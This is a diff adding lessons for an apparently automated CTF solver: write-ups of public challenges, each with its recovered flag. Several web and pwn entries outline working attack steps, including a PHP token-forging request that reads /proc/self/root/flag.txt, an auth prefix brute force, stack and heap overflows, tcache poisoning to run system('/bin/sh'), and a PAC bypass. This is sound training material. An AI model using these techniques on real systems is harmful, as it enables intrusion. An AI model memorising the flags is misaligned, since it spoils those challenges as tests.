 - Image evidence should record recipe details such as `b1,rgb,lsb,xy` so the write-up can be reproduced.
+
+### BMP QuickStego Plus Braille ASCII
+
+Signal:
+
+- BMP header is clean: no appended data, no metadata, and pixel data ends exactly at EOF.
+- `zsteg` reports noisy LSB candidates, repeated filler characters, or false file signatures but no stable flag.
+- Statement hints at Windows tooling, blindness, light, closed eyes, or opening windows.
+
+Reproduction:
+
+```bash
+file /Users/5haw0/Downloads/coolguy.bmp
+/Users/5haw0/.gem/ruby/2.6.0/bin/zsteg /Users/5haw0/Downloads/coolguy.bmp
+# QuickStego on Windows reveals:
+# 2471491ED07C69930E8F994E383E415F
+python3 scripts/solve_coolguy_bmp.py /Users/5haw0/Downloads/coolguy.bmp
+```
+
+In the solved `coolguy.bmp` / `In Your Eyes` sample, QuickStego recovered:
+
+```text
+2471491ED07C69930E8F994E383E415F
+```
+
+Converting the hex to binary without left-zero padding and splitting into 6-bit Braille ASCII cells yields:
+
+```text
+CSICTF_<UCBR#DILL#C.)
+```
+
+Read the Braille semantics rather than raw ASCII: `_<` is `{`, `.)` is `}`, and numeric indicator `#` turns `D`/`C` into `4`/`3`.
+
+Flag:
+
+```text
+csictf{ucbr4ill3}
+```
+
+Solver lesson:
+
+- When an image stego prompt says "Windows tool" and Linux LSB tools only produce filler/noise, test QuickStego or an equivalent extractor before overfitting bit-plane artifacts.
+- Braille CTF answers may use Braille ASCII as an intermediate. Preserve both the raw Braille ASCII text and the semantic normalization step in the write-up.
+
+### 1-Bit Visual-Cryptography Shares
+
+Signal:
+
+- Two or more PNGs look like balanced black/white or gray noise.
+- `file` reports 1-bit grayscale, or pixel counts are exactly or nearly 50/50.
+- The statement says a cipher is hidden "in these images" rather than in metadata.
+
+Reproduction:
+
+```python
+from pathlib import Path
+from PIL import Image
+
+img1 = Image.open("Battle1.png").convert("1")
+img2 = Image.open("Battle2.png").convert("1")
+revealed = bytes(a ^ b for a, b in zip(img1.tobytes(), img2.tobytes()))
+Image.frombytes("1", img1.size, revealed).save("revealed.png")
+```
+
+In the solved Battle sample, XOR revealed a Roman battle scene with `SPQR`, the ciphertext:
+
+```text
+XFOK XKEK XKDK
+```
+
+and the instruction:
+
+```text
+Decipher the encrypted text and write the name of the author of the quotation in ALL CAPITAL LETTERS
+```
+
+The Roman context and 4-4-4 quote structure identify the quotation as `VENI VIDI VICI`; the author is `JULIUS CAESAR`.
+
+Solver lesson:
+
+- For noise-like 1-bit image pairs, try pixel XOR/equality/difference before metadata-heavy stego.
+- Save a rendered reveal artifact for manual reading; OCR may not be available or reliable on dithered text.
+- Treat visible themed art and instruction text as part of the cipher evidence, not just decoration.
 
 ### Extra Or Independent PNG IDAT Payload
 
@@ -1226,6 +1902,8 @@ Reproduction strategy:
 Solver lesson:
 
 - PwnSolver write-ups for shell-oriented cases should output a full Python exploit script with local/remote mode, binary/libc configuration, and interaction.
+- Future ForgeFlag Pwn exp scripts should follow the local reference style in `/Users/5haw0/学习/CTF/pwn/堆基本结构及利用讲义-例题/lesson-after/level6-64/freenote_x64.py`: pwntools-first setup, local debug default, explicit remote branch, menu action helpers, leak/exploit phase split, gdb breakpoint helper, and logged heap/libc/code address derivations.
+- Pwn solve status requires proof, not just a plausible shell path. When the real flag/service is absent, place a local test flag beside the challenge binary or inside the local container, replay the exploit, run `cat flag` or equivalent through the obtained primitive, and record the command transcript before labeling the case `exploit_verified`.
 
 ### Ret2win Source Pattern
 
@@ -1648,6 +2326,7 @@ Solver lesson:
 
 ## ForgeFlag Backlog From These Cases
 
+- Extend verifier support for additional platform-specific wrappers and aliases beyond the current single-line punctuation/space-safe flag extraction.
 - Add static JS fetch and comment/string extraction for same-origin scripts.
 - Add public/private boolean API parameter hints for status/feed style web apps.
 - Add image metadata transform decoding to both ForensicsSolver and MiscSolver.
@@ -1662,3 +2341,1167 @@ Solver lesson:
 - Add modular matrix conjugation solve script generation.
 - Improve PwnSolver deep triage: unsafe scanf, stack variable overwrite, heap chunk adjacency, imported `system`, and generated non-interactive command execution exploit.
 - Improve report wording so write-ups describe exactly how the flag was recovered, not generic solver summaries.
+
+## Held-Out Platform Adapter Lessons
+
+### DUCTF 2024: Baby's First Forensics
+
+Category:
+
+- Traffic / HTTP scanner fingerprinting.
+
+Signal:
+
+- PCAP contains repeated HTTP requests with a user-agent like `Mozilla/5.00 (Nikto/2.1.6)`.
+- The statement asks for the tool and version and says to wrap the answer in `DUCTF{}`.
+
+Shortest path:
+
+```text
+User-Agent: Mozilla/5.00 (Nikto/2.1.6)
+DUCTF{nikto_2.1.6}
+```
+
+Solver lesson:
+
+- TrafficSolver should scan HTTP request summaries and followed streams for scanner user-agents, normalize `tool/version` to `tool_version`, and wrap it in the platform flag prefix when the statement supplies one.
+
+### HTB Dynastic And DUCTF shufflebox
+
+Category:
+
+- Crypto / classical transforms.
+
+Signal:
+
+- Dynastic gives one uppercase ciphertext line and asks to wrap decrypted text in `HTB{}`.
+- shufflebox gives 16-byte known plaintext mappings plus one censored 16-byte row.
+
+Shortest path:
+
+- For Trithemius-style shifts, decrypt each alphabetic byte by subtracting its absolute character index while preserving punctuation.
+- For shufflebox, infer each output position's source index from the known rows, then invert the censored row.
+
+Solver lesson:
+
+- CryptoSolver should run position-dependent Caesar/Trithemius before generic Vigenere escalation.
+- Known plaintext examples can recover a full small permutation without brute force.
+
+### DUCTF 2024: Bad Policies
+
+Category:
+
+- Forensics / Group Policy Preferences.
+
+Signal:
+
+- ZIP contains Windows Group Policy paths and `Machine/Preferences/Groups/Groups.xml`.
+- `Groups.xml` contains a `cpassword` attribute.
+
+Shortest path:
+
+```text
+unzip -p badpolicies.zip '*/Machine/Preferences/Groups/Groups.xml'
+decrypt cpassword with the published GPP AES key
+DUCTF{D0n7_Us3_P4s5w0rds_1n_Gr0up_P0l1cy}
+```
+
+Solver lesson:
+
+- Archive previews must prioritize `Groups.xml` and `Preferences` paths, not only names containing `flag` or `secret`.
+- ForensicsSolver should decrypt GPP `cpassword` values directly and preserve the username, entry path, ciphertext, and recovered password as replay evidence.
+
+### DUCTF 2024: Intercepted Transmissions
+
+Category:
+
+- Misc / radio teletype encoding.
+
+Signal:
+
+- Attachment is a long binary-looking string with length divisible by 7.
+- Valid groups often have four `1` bits and three `0` bits, matching CCIR476/SITOR.
+- Decoded text may be a sentence that the statement asks to wrap in the platform format, and the official flag can contain spaces or punctuation inside braces.
+
+Shortest path:
+
+```text
+split bits into 7-bit CCIR476 symbols
+track LTRS / FIGS mode controls
+wrap decoded message as DUCTF{...}
+DUCTF{##TH3 QU0KK4'S AR3 H3LD 1N F4C1LITY #11911!}
+```
+
+Solver lesson:
+
+- Misc transforms should try CCIR476 before giving up on 7-bit binary streams.
+- The verifier must preserve complete source-derived flag candidates in evidence; a preview-limited transform list is not enough for acceptance.
+- Flag extraction should allow single-line official flags with spaces and punctuation when the prefix is CTF-like.
+
+### DUCTF 2024: Wacky Recipe
+
+Category:
+
+- Misc / recipe-state puzzle.
+
+Signal:
+
+- Prompt and title are recipe-themed and mention `Chicken Parmi`.
+- The attachment describes bowl state changes with ingredient quantities instead of a normal arithmetic formula.
+- The target output is a small textual ingredient choice rather than a large brute-force domain.
+
+Shortest path:
+
+```text
+model each bowl update as a linear expression over ingredient variables
+brute force the small ingredient domain against the final recipe evidence
+wrap the recovered quantity and ingredient in DUCTF{...}
+DUCTF{2tsp_Vegemite}
+```
+
+Solver lesson:
+
+- MiscSolver should treat structured cooking/esolang prose as stateful arithmetic, not as free-form text.
+- Preserve the title and preamble as evidence because held-out manifests may score the exact challenge context, not only the recovered flag.
+- A tiny domain brute force is often more robust than trying to infer a full general interpreter on the first pass.
+
+### DUCTF 2024: DNAdecay
+
+Category:
+
+- Misc / damaged esolang source reconstruction.
+
+Signal:
+
+- Attachment is a Ruby file with `require "doublehelix"`.
+- The body is DNA-art source made from `A/T/G/C`, hyphens, and spaces.
+- Corruption replaces some meaningful characters with spaces, leaving a small number of fully ambiguous rows.
+
+Shortest path:
+
+```text
+match every body row against the mame/doublehelix 18-row format cycle
+map AT/CG/GC/TA to 00/01/10/11
+pack bits in Ruby pack("b*") little-endian byte order
+rank decoded Ruby outputs that look like puts"DUCTF{...}"
+DUCTF{7H3_Mit0cHOndRi4_15_7he_P0wEr_HoUsE_of_DA_C3LL}
+```
+
+Solver lesson:
+
+- Do not try to execute the corrupted Ruby source or depend on the `doublehelix` gem. The useful evidence is the static row format.
+- Fully blank DNA rows are real ambiguous base-pair evidence and must keep their line index; dropping them breaks the format cycle.
+- Keep output bounded. A few missing rows can generate many flag-like variants, so rank leetspeak-readable Ruby strings and preserve only the top candidates.
+
+### DUCTF 2024: jmp flag
+
+Category:
+
+- Reverse / local ELF validation logic.
+
+Signal:
+
+- Stripped ELF has a dense region of 128-byte dispatch blocks.
+- Blocks contain large immediate masks in `and` or `movabs` instructions.
+- The validation order is not lexical; each character's position is encoded by the popcount of its dependency mask.
+
+Shortest path:
+
+```text
+disassemble 128 blocks from the dispatch region with Capstone
+skip terminal ret-only blocks
+map character index to mask
+place each character at popcount(mask)
+wrap recovered body with the DUCTF prefix
+DUCTF{tAb1HFK5h3ZgEX7UTMQfsivcPOaJ?nRy8jrYLVB9Ilempw6xWq2zC0d!SDukG4No}
+```
+
+Solver lesson:
+
+- ReverseSolver should not rely only on truncated `objdump` text for dense jump-table binaries; byte-backed Capstone disassembly is a safer replay path.
+- Preserve the recovered body, wrapper prefix, mask-order pattern, and source (`capstone`, `objdump`, or raw bytes) in evidence.
+- For position encodings, test popcount/order transforms before escalating to symbolic execution.
+
+### UMDCTF 2024: cmsc430
+
+Category:
+
+- Reverse / local ELF validation logic.
+
+Signal:
+
+- ELF contains debug or helper symbols such as `entry` and `read_byte`.
+- The validation chain repeatedly reads one byte, then compares a tagged integer immediate where the original input byte is multiplied by two.
+- Tool-wrapper `objdump` output can truncate before the validation chain, so the useful evidence may require binary-byte scanning.
+
+Shortest path:
+
+```text
+scan disassembly or raw binary bytes for call-like read_byte sites
+find nearby mov eax, imm32 checks
+keep even printable immediates and decode chr(imm / 2)
+join the equality chain and verify flag wrappers
+UMDCTF{shout_out_to_jose}
+```
+
+Solver lesson:
+
+- ReverseSolver should treat truncated disassembly as a recoverable tool limitation, then scan the local binary bytes for compact validation idioms.
+- Preserve whether recovery came from `objdump` text or raw bytes, the tagged immediate encoding, decoded text, and flag candidates.
+- Byte-level scanners must avoid false `call` hits inside instruction immediates, such as an `0xe8` byte embedded in `mov eax, imm32`.
+
+### DUCTF 2024: three line crypto
+
+Category:
+
+- Crypto / self-synchronizing XOR stream.
+
+Signal:
+
+- The handout script is only a few lines and uses `q[y % 16] ^ x`, then updates `y = x`.
+- The key has 16 random bytes, but each byte is selected by the previous plaintext byte's low nibble.
+- The prompt says the hidden `passage.txt` is English text and the platform flag wrapper is DUCTF.
+
+Shortest path:
+
+```text
+detect q[y % 16] ^ x and y = x in encrypt.py
+read passage.enc.txt as raw bytes
+use DUCTF{...} and common CTF XOR idiom cribs
+verify each candidate by key-slot consistency across the ciphertext bytes
+DUCTF{when_in_doubt_xort_it_out}
+```
+
+Solver lesson:
+
+- Self-synchronizing XOR challenges may be solvable without recovering the whole English passage first.
+- A candidate flag should only be accepted when its bytes impose consistent values for repeated previous-plaintext low-nibble key slots.
+- Platform naming matters: `DownUnderCTF` context should infer the `DUCTF{...}` wrapper even when the exact string `DUCTF` is not in the prompt.
+
+### TJCTF 2024: accountleak
+
+Category:
+
+- Crypto / local service RSA replay.
+
+Signal:
+
+- The provided Python service chooses RSA primes, computes `c = password^65537 mod n`, and prints `c` plus `n`.
+- An interaction branch leaks `dont_leak_this = (p-sub)*(q-sub)`, where `sub` is bounded by `getRandomInteger(20)`.
+- The recovered password must be submitted quickly to the same challenge service to receive the flag.
+
+Shortest path:
+
+```text
+start the provided server.py in the challenge directory
+parse c and n from the first service transcript
+send yea to trigger the shifted factor leak
+for s in range(1, 2**20):
+    p_plus_q = (n + s*s - leak) // s
+    solve t^2 - p_plus_q*t + n = 0
+decrypt the password with recovered p and q
+submit the password to the same local service
+tjctf{h3y_wh3r3_d1d_my_d1am0nds_g0_th3y_w3r3_ju5t_h3r3}
+```
+
+Solver lesson:
+
+- This is a replay proof, not a static read of the repository's `flag.txt`; the accepted flag should come from the running local/authorized service transcript.
+- For leaks shaped like `(p-s)(q-s)`, derive `p+q = (n + s^2 - leak) / s` and solve the quadratic instead of trying to factor `n` directly.
+- Challenge prompts may omit trailing newlines, so replay helpers should read byte streams, not only line-buffered output.
+
+### IrisCTF 2024: Accessible Sesamum Indicum
+
+Category:
+
+- Crypto / local service combinatorial replay.
+
+Signal:
+
+- The provided Python service asks for a 4-character PIN over `0123456789abcdef`.
+- Each vault keeps a sliding 4-character window and allows only about `16^4` digit attempts.
+- The service consumes a submitted line from right to left with `attempt.pop()`, so a normal left-to-right De Bruijn stream must be reversed before submission.
+
+Shortest path:
+
+```text
+start chal.py with cwd set to the challenge directory containing flag.txt
+generate B(16, 4), append the first 3 symbols, then reverse the stream
+for each of 16 vaults:
+    wait for Attempt>
+    submit the reversed De Bruijn stream as one line
+capture the final local service transcript
+irisctf{de_bru1jn_s3quenc3s_c4n_mass1vely_sp33d_up_bru7e_t1me_f0r_p1ns}
+```
+
+Solver lesson:
+
+- The proof should come from the running local/authorized challenge service transcript, not from reading the repository's `flag.txt`.
+- De Bruijn replay is the right primitive when the attempt budget is approximately `alphabet_size ** window_length`.
+- Always inspect input direction; reversing the attempt stream is required when the service pops from the end of each submitted line.
+
+### IrisCTF 2024: babycha
+
+Category:
+
+- Crypto / chosen-plaintext stream-cipher misuse replay.
+
+Signal:
+
+- The challenge claims ChaCha20, but `encrypt()` fills its buffer with serialized `state` words before calling `chacha_block(state)`.
+- The menu allows chosen plaintext encryption before asking to encrypt the flag.
+- A full known-plaintext block reveals the current 16-word state because the plaintext is XORed directly with that serialized state buffer.
+
+Shortest path:
+
+```text
+start the provided chal.py as a local challenge service
+choose menu option 1 and encrypt 64 known bytes
+XOR the known plaintext with the returned ciphertext to recover the serialized state
+compute chacha_block(recovered_state) locally
+choose menu option 2 and XOR the flag ciphertext with the next serialized state
+irisctf{initialization_is_no_problem}
+```
+
+Solver lesson:
+
+- Do not treat the ChaCha label as proof that the implementation is standard; inspect when keystream bytes are generated and when state updates happen.
+- Chosen plaintext is enough here because the first block is the raw state buffer, not the normal ChaCha block output.
+- Preserve the local service transcript and recovered state-word count as proof that the flag came from replay, not from a README answer line.
+
+### UMDCTF 2024: giedi-composite
+
+Category:
+
+- Crypto / composite-ring NTRU lattice replay.
+
+Signal:
+
+- The handout defines `Rq = Zmod(q)[x] / (x^N - 1)` with `N = 210`, `q = 2003`, and `p = 3`.
+- The public key is `p * f_q^-1 * g`, where `f` and `g` are short ternary polynomials.
+- The ciphertext is `b * pub + msg`, and `output.txt` provides only public key and ciphertext coefficient lists.
+
+Shortest path:
+
+```text
+parse pub and ct from output.txt
+factor x^210 - 1 into the degree-70 CRT components x^70 - x^35 + 1, x^70 + x^35 + 1, and x^70 - 1
+for each component:
+    build the NTRU lattice [I conv(pub); 0 qI]
+    run BKZ to recover a short key residue
+recombine residues with the CRT basis
+try cyclic key shifts and decrypt ct modulo p
+UMDCTF{NTRUly_a_n1c3_j0b}
+```
+
+Solver lesson:
+
+- Composite `N` can make the quotient ring split into smaller components; exploit that structure instead of attacking the full dimension first.
+- Sage in the local toolchain may not have PyCryptodome, so replay helpers should avoid `Crypto.Util.number` when standard integer-to-bytes code is enough.
+- The accepted proof should come from `output.txt` plus the Sage lattice replay, not from `flag.txt` or `challenge.yaml`.
+
+### UMDCTF 2024: attack of the worm
+
+Category:
+
+- Misc / ML adversarial pixel replay.
+
+Signal:
+
+- The handout ships `model.pt`, `server.py`, and `worm.png`.
+- `server.py` accepts at most 30 `x,y,r,g,b` pixel changes, then prints the flag only if `sigmoid(model(modified)) < 0.5`.
+- The model path leaves ResNet18 in train mode, so local replay must match `server.py`; switching to `model.eval()` changes the baseline score and can invalidate candidate pixels.
+
+Current replay state:
+
+```text
+forgeflag-worm-replay:latest builds a CPU PyTorch container for the local model/server path
+original train-mode server score: 0.578890
+30-pixel fixed-gradient attempts reached 0.564 but did not pass the 0.5 threshold
+single-sample greedy pixel search reached 0.527681; trusted single-sample beam search reached 0.522511 but did not pass the 0.5 threshold
+the script supports --score-only for exact server-mode payload scoring, --payload-file for cached candidates, --payload for known-good payloads, --regenerate for the bundled slow optimizer, --search-unstable for bounded unstable-pixel gradient search, --search-seeds for seed sweeps, and --search-output / --payload-output for search result persistence
+```
+
+Solver lesson:
+
+- This remains a blocker, not an accepted scorecard pass. Do not accept the README or `flag.txt`; only accept a service-returned flag after a valid pixel payload.
+- Public writeups confirm the intended attack family is sparse adversarial pixels, but replay helpers should preserve the exact PyTorch mode/version and pixel count because classifier-mode drift changes results.
+- Do not batch-score candidate images while the model is in train mode. BatchNorm statistics differ from the single-image `server.py` path and can produce false adversarial-looking probabilities.
+- Use `--search-unstable --search-seeds <a,b,c> --search-steps <k> --candidate-trials <m> --search-output <json> --payload-output <txt>` for repeatable seed-sweep CPU experiments; the short smoke path with one step and one trial proves the wrapper emits final JSON, `all_results`, and a reusable payload file without committing to a long search.
+- Future work: make candidate evaluation faster without changing BatchNorm semantics, or cache a verified 30-pixel payload after reproducing it locally.
+
+### TJCTF 2024: golf-hard
+
+Category:
+
+- Misc / recursive regex verifier replay.
+
+Signal:
+
+- The local service asks for five short regexes and checks them with Python's third-party `regex` module in `regex.V1` mode.
+- Levels cover starts-with, unary subtraction, balanced angle brackets, palindromes, and unary multiplication.
+- The challenge bundle's `golf.py` reads the flag only after every regex passes all visible and generated hidden tests.
+
+Shortest path:
+
+```text
+start the provided golf.py in a temporary local challenge directory
+shim the display-only tabulate dependency if it is not installed
+submit these bounded patterns:
+  ^a
+  ^(x*)(x*)-\1=\2$
+  ^(<(?1)*>)+$
+  ^((.)(?1)\2|.?)$
+  ^(x*).(x(?2)\1|=)$
+capture the final service transcript
+tjctf{even_in_death_I_serve_the_PCRE_Standard_3ceb7afc}
+```
+
+Solver lesson:
+
+- The proof should come from the running verifier transcript, not from reading `flag.txt`.
+- Recursive regex features such as `(?1)` can express balanced delimiters, palindromes, and unary multiplication inside tight golf limits.
+- Presentation dependencies like `tabulate` can be shimmed in a bounded local harness when they are unrelated to the challenge verifier.
+
+### DownUnderCTF 2024: I See
+
+Category:
+
+- Misc / hardware-source I2C EEPROM replay.
+
+Signal:
+
+- The published schematic exposes an `M24C02-WMN` EEPROM with `SDA` and `SCL` nets.
+- Connector labels expose the nearby `IO24` and `IO25` hardware pins.
+- The local source cache includes the EEPROM image used to program the challenge board.
+
+Shortest path:
+
+```text
+extract schematic text from publish/schematic.pdf
+confirm M24C02-WMN plus SDA/SCL/IO24/IO25 evidence
+read src/eeprom.bin as the EEPROM contents
+scan printable text for the DUCTF flag
+DUCTF{I2C_the_flag_now_fcee2acf}
+```
+
+Solver lesson:
+
+- For hardware CTF tasks, the schematic often answers what bus/device to read even when the flag is stored in a separate chip image or live board state.
+- Preserve both the schematic clue and the dump-derived flag; a raw strings hit alone loses the hardware reasoning.
+- Mark this as hardware-source replay when the EEPROM dump comes from the local source cache rather than the published PDF handout.
+
+### NUS Greyhats Welcome CTF 2024: Cecure Cerver
+
+Category:
+
+- Web / C HTTP Basic Auth prefix bypass.
+
+Signal:
+
+- The server manually parses an `Authorization: Basic ...` header and compares username/password with `strncmp(s1, s2, strlen(s1))`.
+- The real credentials are random hex strings, so a one-character prefix over `0123456789abcdef` is enough to satisfy the comparison.
+- The service reads `flag.txt` only after both vulnerable comparisons pass.
+
+Shortest path:
+
+```text
+compile the provided server.c locally
+place uname.txt, pwd.txt, and flag.txt in the server working directory
+for each one-character hex username/password prefix:
+    send GET / with Authorization: Basic base64(prefix_user:prefix_pass)
+    stop when the HTTP response contains grey{...}
+grey{3xpl0171n6_l061c_bu65}
+```
+
+Solver lesson:
+
+- Prefix-length comparisons turn generated long secrets into tiny brute-force spaces when attacker-controlled input is the length source.
+- For local CTF replay, compiling the provided C source can be cleaner than requiring the Linux challenge ELF to run on the host.
+- Preserve the HTTP response and discovered prefix rather than reading the flag file directly.
+
+### NUS Greyhats Welcome CTF 2024: Private Hidden Paths
+
+Category:
+
+- Web / PHP token shaping and procfs file disclosure.
+
+Signal:
+
+- The service signs token data, but the token body is built with `pack("i$p", $a, $u)` where `p` is user-controlled.
+- PHP `pack()` format operator `X` rewinds the output cursor, so `XXXXa*` can overwrite the four-byte permissions integer with attacker-controlled username bytes.
+- Once permissions unpack as `0x1337`, the service prefixes paths with `/pro`; requesting `c/self/root/flag.txt` joins into `/proc/self/root/flag.txt`.
+
+Shortest path:
+
+```text
+build and start the provided PHP/Apache Docker service locally
+request /api.php?a=r&p=XXXXa*&u=%37%13%00%00abcde
+use the returned signed token against /api.php?a=g&p=c/self/root/flag.txt
+grey{1_l0v3_php_17_15_50_53cur3}
+```
+
+Solver lesson:
+
+- Signed tokens do not help when the signed byte layout itself is attacker-shaped before signing.
+- Treat PHP `pack()` / `unpack()` format strings as binary parsers, not harmless serialization helpers.
+- Preserve the local Docker transcript, token prefix, joined path, and HTTP response as replay evidence.
+
+### NUS Greyhats Welcome CTF 2024: Stack BOF School
+
+Category:
+
+- Pwn / ret2win stack overflow.
+
+Signal:
+
+- The Linux ELF is non-PIE and exposes a `win` function at a fixed address.
+- The challenge visualizes the stack and prints the return address slot at `buffer[0x38]`.
+- The input parser accepts escaped hex bytes such as `\41`, so the exploit payload is text-shaped but writes raw bytes into the buffer.
+- The distribution flag is a training placeholder; the service directory contains the real challenge flag.
+
+Shortest path:
+
+```text
+locate win with objdump -t challenge
+build payload: "A" * 56 + escaped little-endian win address + newline
+run the Linux ELF in a local Ubuntu container with the service directory mounted
+grey{d1d_y0u_n0t1ce_m3m0ry_1n_l1ttl3_3nd14n_and_the_difference_between_raw_bytes_and_their_hex_representations?}
+```
+
+Solver lesson:
+
+- Preserve the offset, symbol address, and exact input encoding; raw packed bytes and escaped-byte text are different payload surfaces.
+- Reject placeholder training flags during replay validation.
+- For Linux ELF handouts on macOS, an ordinary local Ubuntu container can be enough when the binary and `flag.txt` live in one directory.
+
+### NUS Greyhats Welcome CTF 2024: Epic Boss Fight / pwn01
+
+Category:
+
+- Pwn / signed integer overflow.
+
+Signal:
+
+- The challenge stores `boss_hp` as `short int` and initializes it to `10000`.
+- The defend action adds `1000` HP each turn while the win condition checks `boss_hp <= 0`.
+- After 23 defend actions, signed 16-bit wraparound turns `33000` into `-32536`, so the program reaches `win()`.
+- The service handout uses `grey{...}`, while the dojo manifest expects the same body under `flag{...}`.
+
+Shortest path:
+
+```text
+run the Linux ELF in a local Ubuntu container with the service directory mounted
+send "2\n" 23 times
+capture service_flag: grey{i_wonder_how_negative_integers_are_shown_in_memory?}
+emit manifest flag: flag{i_wonder_how_negative_integers_are_shown_in_memory?}
+```
+
+Solver lesson:
+
+- Model C integer width and signedness before trying long interactive loops.
+- Preserve the action count and overflow value as replay evidence.
+- When a benchmark platform changes only the flag prefix, keep both the original service flag and the normalized manifest flag visible.
+
+### TJCTF 2024: baby-heap
+
+Category:
+
+- Pwn / heap off-by-one size overwrite.
+
+Signal:
+
+- The binary allocates adjacent `a`, `b`, and `reader` chunks, then reads the flag into `reader[1]`.
+- A one-byte write at `a[size]` controls the low byte of `b`'s chunk size.
+- After freeing `b`, requesting `0x90` bytes returns an overlapping chunk whose `chunk + 0x20 == reader` assertion succeeds.
+
+Shortest path:
+
+```text
+run the Linux ELF in a local Ubuntu container with bin/ mounted
+send attack_size = 0xa1
+send new_size = 0x90
+preserve overlap_evidence: blocker + 0x10 == c: 1
+tjctf{bby-eap-lol171296386}
+```
+
+Solver lesson:
+
+- In heap warmups, one-byte size corruption can be enough when the challenge fixes the heap layout for you.
+- Preserve allocator evidence such as chunk addresses, forged size, requested allocation size, and overlap assertions.
+- Running the Linux ELF directly in a local container is enough when the challenge binary and `flag.txt` are co-located.
+
+### IrisCTF 2024: Insanity Check
+
+Category:
+
+- Pwn / fixed-suffix return-address alignment.
+
+Signal:
+
+- The source copies `name` into `message[128]`, then appends a fixed welcome suffix with `memcpy`.
+- The custom-linked `win` symbol is placed at `0x6d6f632e`, whose little-endian bytes are `.com\0\0\0\0`.
+- The fixed suffix contains `test@example.com\0\0\0\0`, so input length can align the suffix `.com` bytes over saved RIP.
+
+Shortest path:
+
+```text
+message to saved RIP: 0x98 bytes
+prefix length: len("Hi there, ") = 10
+suffix ".com" offset: 86
+name length: 0x98 - 10 - 86 = 56
+send "A" * 56 + "\n" in a local amd64 Linux container with /flag mounted
+irisctf{c0nv3n13nt_symb0l_pl4cem3nt}
+```
+
+Solver lesson:
+
+- Treat target addresses as byte strings, especially when the prompt mentions custom linkers or unusual symbol placement.
+- A bounded input can still control saved RIP when a later fixed suffix append overflows the stack frame.
+- Use an inner timeout for replay because the redirected function may print the flag but leave the process on an unstable return path.
+
+### DownUnderCTF 2024: sign-in
+
+Category:
+
+- Pwn / UAF linked-list reuse.
+
+Signal:
+
+- `remove_account` frees `curr->user` and then frees the list entry.
+- `sign_up` allocates a new `user_t` followed by a new `user_entry_t`, but does not initialize `entry->next`.
+- The previous user's password bytes can become the reused list entry's `next` pointer.
+- Non-PIE address `0x402eb8` points to a stable zero-filled region suitable for a fake uid-0 user with empty username and password.
+
+Shortest path:
+
+```text
+sign up x with password p64(0x402eb8)
+sign in as x and remove the account
+sign up x/y to reuse freed chunks
+sign in with 8 zero bytes for username and password
+choose get shell
+cat flag.txt
+DUCTF{welcome_root!_9dbfa98e17b7af9dbc1}
+```
+
+Solver lesson:
+
+- Menu pwn replay must respect mixed `scanf` and raw `read` input semantics; prompt-driven writes are safer than one huge stdin blob.
+- Track heap chunk reuse between different struct types, not only within a single allocation site.
+- Preserve the fixed pointer, allocation order, and uid-0 empty-credential evidence.
+
+### DownUnderCTF 2024: pac shell
+
+Category:
+
+- Pwn / AArch64 pointer authentication.
+
+Signal:
+
+- The binary prints PAC-signed pointers for `help`, `ls`, `read64`, and `write64`.
+- The menu accepts a pointer, authenticates it with `autiza`, then calls it.
+- `read64` and `write64` provide arbitrary memory access.
+- `help()` signs each entry in the writable `BUILTINS` function table before printing it.
+
+Shortest path:
+
+```text
+run pacsh inside the local AArch64 ForgeFlag Docker image
+parse the signed help/read64/write64 pointers and derive PIE from help - 0xb7c
+call ls once so system@got is resolved
+read system@got -> libc base
+read libc environ -> stack pointer neighborhood
+scan downward for the saved signed read64 pointer, then back up to the active call frame
+write /bin/sh at sp+0x60 and system at sp+0x8
+write a libc gadget into BUILTINS[1].fptr
+call help so the challenge signs that gadget
+call the signed gadget and run cat flag.txt
+DUCTF{did_you_just_bruteforce_the_pac?:(}
+```
+
+Solver lesson:
+
+- PAC changes the usual "write function pointer and call it" flow; reuse the program's own signing gadget when a helper signs writable table entries.
+- Avoid blind reads across unmapped stack space. `libc.environ` gives a mapped stack anchor, and the saved signed function pointer gives a compact frame locator.
+- Keep the replay in a local challenge container and read the flag from the running service path; do not accept a nearby source-tree `flag.txt` as proof by itself.
+
+### UMDCTF 2024: chisel
+
+Category:
+
+- Pwn / glibc tcache poisoning.
+
+Signal:
+
+- The menu keeps one global chunk pointer and exposes alloc, free, edit, print, and a `chisel` helper allocation.
+- The free path does not clear the global pointer, so print/edit-after-free exposes both leak and write primitives.
+- A small freed tcache chunk leaks the safe-linking heap mask, while a large freed chunk leaks a libc arena pointer.
+- The bundled glibc exposes `__malloc_hook`, `system`, and `/bin/sh` offsets usable in a local challenge replay.
+
+Shortest path:
+
+```text
+run chisel with the shipped loader and libc inside an amd64 Debian Docker container
+free and print a 24-byte chunk to leak heap >> 12
+free and print a large chunk to leak libc_base + 0x1e0c00
+poison the small tcache fd with (heap >> 12) xor __malloc_hook
+allocate twice, overwrite __malloc_hook with system, allocate /bin/sh, then run cat flag.txt
+UMDCTF{a_glorious_statue_for_a_glorious_baron}
+```
+
+Solver lesson:
+
+- Heap proof harnesses should preserve raw leaks, derived heap/libc base, hook target, and the poisoned tcache value.
+- Prompt-driven menu wrappers are more stable than sending one large stdin blob when allocations and frees are interleaved.
+- Keep the exploit in a local challenge container with the shipped `ld-linux` and `libc.so.6`; host glibc offsets are not valid evidence.
+
+### Hack The Box Cyber Apocalypse 2024: Maze of Mist
+
+Category:
+
+- Pwn / 32-bit VM handout / ret2vdso.
+
+Signal:
+
+- The challenge README describes a QEMU handout with `vmlinuz-linux`, `initramfs.cpio.gz`, `run.sh`, and a setuid `/target` inside the rootfs.
+- The cached artifact currently contains only `htb/exploit.py` and README/writeup evidence, not the bootable VM artifacts or extracted `target` binary.
+- The exploit uses a fixed `VDSO_BASE_ADDR = 0xf7ffc000`, VDSO gadgets such as `POP_EDX_ECX`, `MOV_EAX_ECX_PLUS_EBP_M20`, and `SYSCALL_POP_EBP_EDX_ECX`, plus a `/bin/sh` stack string.
+
+Shortest path once the full local handout is recovered:
+
+```text
+verify vmlinuz-linux, initramfs.cpio.gz, run.sh, and /target are present
+boot the local authorized VM with the shipped run.sh
+extract/check /target and confirm the 0x20 stack buffer plus 0x200 read primitive
+replay the ret2vdso payload against the running VM challenge target
+read /root/flag.txt from the local VM and preserve transcript evidence
+```
+
+Solver lesson:
+
+- Do not accept README/writeup flag text as proof for VM pwn cases. A valid ForgeFlag solve needs the original bootable handout or an extracted target plus equivalent local service replay.
+- `scripts/solve_maze_of_mist_static.py` is a blocker helper, not a flag solver: it parses ret2vdso constants and reports the missing VM artifacts so the manager queue stays honest.
+- VM pwn cases need an artifact-completeness gate before exploit execution; otherwise the scorecard can confuse "known public answer" with "locally replayed proof-of-solve".
+
